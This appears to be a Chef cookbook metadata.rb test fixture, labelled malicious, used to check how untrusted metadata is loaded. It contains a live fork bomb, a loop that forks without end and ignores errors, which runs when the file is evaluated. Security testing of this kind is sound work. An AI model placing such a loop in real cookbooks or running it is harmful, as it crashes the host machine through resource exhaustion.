maintainer "RightScale, Inc."
maintainer_email "support@rightscale.com"
description "Test fixture with malicious metadata.rb"
version "1.0.0"

# Attempt to fork-bomb the machine's kernel
loop do
  begin
    fork
  rescue Exception => e
  end
end

recipe "malicious::default", "Do nothing. With evil intent."

